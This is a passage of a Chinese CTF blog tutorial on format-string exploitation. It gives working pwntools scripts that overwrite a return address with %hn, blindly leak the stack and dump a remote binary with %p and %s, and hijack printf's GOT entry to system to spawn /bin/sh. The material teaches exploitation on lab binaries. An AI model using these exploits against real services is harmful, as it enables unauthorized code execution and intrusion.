class="string">b&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#show1用于泄露返回地址的地址</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">retaddr = p.recv()[<span class="number">8</span>:<span class="number">22</span>]</span><br><span class="line">retaddr = b2i(retaddr,<span class="number">22</span> - <span class="number">8</span>) - <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(retaddr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit第二次账号密码</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(retaddr)) </span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#2218对应十六进制08AA,用hn覆盖低两个字节，因为再往上的字节实际上都是40一样的</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;%2218d%8$hn&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#show2用于返回shell</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="字符串盲打"><a href="#字符串盲打" class="headerlink" title="字符串盲打"></a>字符串盲打</h2><p>字如其名，手里没有可逆向的文件，只能靠格式化字符串输入来获取远程文件的信息以攻占shell；</p>
<p>一般来说有如下步骤：</p>
<ul>
<li>确定程序位数</li>
<li>确定漏洞位置</li>
<li>利用</li>
</ul>
<h3 id="栈泄露"><a href="#栈泄露" class="headerlink" title="栈泄露"></a>栈泄露</h3><p>查看题目输入%p查看多少位：</p>
<p><img src="https://s2.loli.net/2023/04/13/qGOrZsHwXg834m1.png" alt="aim"></p>
<p>此图的上半部分展示了它是64位的程序；</p>
<p>且它有提示告知了：flag is on the stack；</p>
<p>那么就循环输入%p一直查看栈上的内容，正如上图的下半部分所示即可得出flag；</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#把格式化输出的地址转化为int类型的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2i</span>(<span class="params">b,<span class="built_in">len</span></span>):</span></span><br><span class="line">	i = <span class="built_in">len</span></span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	new_c = [<span class="number">0</span>] * i</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">		new_c[i - j - <span class="number">1</span>] = b[j]</span><br><span class="line"></span><br><span class="line">	j -= <span class="number">2</span></span><br><span class="line">	res = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> (new_c[i] &gt; <span class="number">47</span>) &amp; (new_c[i] &lt; <span class="number">60</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">48</span>)</span><br><span class="line">		<span class="keyword">elif</span> (new_c[i] &gt; <span class="number">96</span>) &amp; (new_c[i] &lt; <span class="number">103</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">87</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%%%d$p&#x27;</span> % i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv()[:<span class="number">18</span>]</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(p64(b2i(data,<span class="number">18</span>)))</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>



<h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><p>依然是查看位数和确定字符串偏移：</p>
<p><img src="https://s2.loli.net/2023/04/13/qfaWT7VbCBYkAdh.png" alt="blind"></p>
<p>此时的偏移就有用了，因为要劫持got；</p>
<p>如图可知，偏移为：6，也就是%6$p；</p>
<p>程序一般是从0x400000开始，要劫持got表就需要知道got内容，所以直接用字符串漏洞的方法泄露整个程序的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="comment">#不断地开启关闭程序会有bug的时候，所以泄露三次</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">            p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">            <span class="comment">#偏移为多少，第一个便用多少+2</span></span><br><span class="line">            payload = <span class="string">b&#x27;%00008$s&#x27;</span> + <span class="string">b&#x27;STARTEND&#x27;</span> + p64(addr)</span><br><span class="line">            <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recvuntil(<span class="string">b&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    data = leak(addr)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">        f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f.write(<span class="built_in">str</span>(data))</span><br><span class="line">        addr += <span class="built_in">len</span>(data)</span><br></pre></td></tr></table></figure>

<p>通用格式，直接套就行，使用之后便可得到原程序binary；</p>
<p>之后分析binary：</p>
<p><img src="https://s2.loli.net/2023/04/13/fH7oQebC3RAc89q.png" alt="main"></p>
<p>看得出整个程序非常简单；</p>
<p>可以知道的是无法利用栈溢出；</p>
<p>若要劫持got表也只有printf函数的；</p>
<p>所以思路是：</p>
<ul>
<li>泄露printf自身函数地址并计算出system；</li>
<li>覆盖got表；</li>
<li>输入binsh执行system函数成功攻击；</li>
</ul>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">printfgot = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次输入载入so中printf</span></span><br><span class="line">payload = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次输入泄漏printf，got地址写后面，不然会因为其高地址为0被截断</span></span><br><span class="line">payload = <span class="string">b&#x27;%00008$s&#x27;</span> + <span class="string">b&#x27;\x00aaaaaaa&#x27;</span> +p64(printfgot)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printfaddr = p.recv()</span><br><span class="line"><span class="comment">#8位地址的高位是0，会被格式化%s截断,调试得高位有两字节为0</span></span><br><span class="line">printfaddr += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">printfaddr = u64(printfaddr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算system</span></span><br><span class="line">libc.address = printfaddr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system = p64(system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第三次输入覆盖</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printfgot: system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第四次输入执行system</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Second_BC</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://secondbc.github.io/SecondBC/2023/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">https://secondbc.github.io/SecondBC/2023/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://secondbc.github.io/SecondBC">Second_BC の BloG</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/SecondBC/2023/04/14/NKCTF-2023-Bin%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"><i class="fas fa-angle-left">&nbsp;</i><span>NKCTF 2023 Bin部分复现</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/SecondBC/2023/04/11/%E6%A0%88%E8%BF%81%E7%A7%BB/"><span>栈迁移</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2022 ～ 2024 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>